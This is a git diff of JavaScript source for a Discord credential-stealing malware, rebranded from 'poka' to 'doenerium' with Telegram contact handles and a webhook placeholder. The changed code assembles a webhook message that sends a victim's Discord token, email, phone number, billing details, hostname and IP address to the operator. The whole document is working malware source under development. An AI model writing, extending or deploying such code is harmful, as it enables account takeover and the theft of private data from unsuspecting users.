@@ -11,7 +11,7 @@ const fs = require("fs");
 // Initialization
 
 var config = {
-    brand: "poka",
+    brand: "doenerium",
 
     webhook: "REPLACE_ME",
 
@@ -20,16 +20,16 @@ var config = {
 
     notify_on_logout: true,
     notify_on_initialization: true,
-    ping: [true, "@<@1028221655857778769>"],
+    ping: [true, "@doener"],
 
     embed: {
-        username: "t.me/@p0ka1337",
+        username: "doenerium | t.me/doenerium",
         footer: {
-            text: `t.me/@p0ka1337`,
-            icon_url: "https://cdn.discordapp.com/avatars/1113194374193492048/98d841632e7c534e1413d604fecb4feb.webp?size=100",
+            text: `doenerium | t.me/doenerium`,
+            icon_url: "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless",
         },
-        href: "t.me/@p0ka1337",
-        avatar_url: "https://cdn.discordapp.com/avatars/1113194374193492048/98d841632e7c534e1413d604fecb4feb.webp?size=100"
+        href: "https://t.me/doenerium",
+        avatar_url: "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless"
     },
 
     badges: {
@@ -740,55 +740,42 @@ async function initialize() {
                     username: config.embed.username,
                     avatar_url: config.embed.avatar_url,
                     embeds: [createEmbed({
-                        title: "Discord | Client initialized",
+                        title: "Discord Client Started",
                         url: config.embed.href,
-                        author: {
-                            name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
-                            url: config.embed.href,
-                            icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
-                        },
                         thumbnail: {
                             url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                         },
                         fields: [{
-                                name: "E-Mail Address",
-                                value: `\`\`\`${userInfo.email}\`\`\``,
-                                inline: true
+                                name: "Computer:",
+                                value: `\`\`\`${os.hostname} - ${network_data['ip'] ?? "Unknown"}\`\`\``,
+                                inline: false
                             },
                             {
-                                name: "Phone Number",
+                                name: "Email:",
+                                value: `\`\`\`${email}\`\`\``,
+                                inline: false
+                            },
+                            {
+                                name: "Phone:",
                                 value: `\`\`\`${userInfo.phone ?? "None"}\`\`\``,
                                 inline: false
                             },
                             {
                                 name: "Nitro",
                                 value: `${getNitro(userInfo.premium_type)}`,
-                                inline: false
-                            }, {
-                                name: "Billing",
-                                value: `${billing}`,
                                 inline: true
                             }, {
                                 name: "Badges",
                                 value: `${getBadges(userInfo.flags)}`,
-                                inline: false
+                                inline: true
+                            }, {
+                                name: "Billing",
+                                value: `${billing}`,
+                                inline: true
                             },
                             {
                                 name: "Token",
                                 value: `\`\`\`${token}\`\`\``,
-                                inline: false
-                            },
-                            {
-                                name: "Hostname",
-                                value: `\`\`\`${os.hostname}\`\`\``,
-                                inline: false
-                            }, {
-                                name: "Client version",
-                                value: `\`\`\`${getDiscordClient()}\`\`\``,
-                                inline: false
-                            }, {
-                                name: "Connection data",
-                                value: `\`\`\`yaml\nIP Address: ${network_data['ip'] ?? "Unknown"}\nHostname: ${network_data['hostname'] ?? "Unknown"}\nCity: ${network_data['city'] ?? "Unknown"}\nRegion: ${network_data['region'] ?? "Unknown"}\nCountry: ${network_data["country"] ?? "Unknown"}\nTimezone: ${network_data["timezone"] ?? "Unknown"}\`\`\``,
                                 inline: false
                             }
                         ],
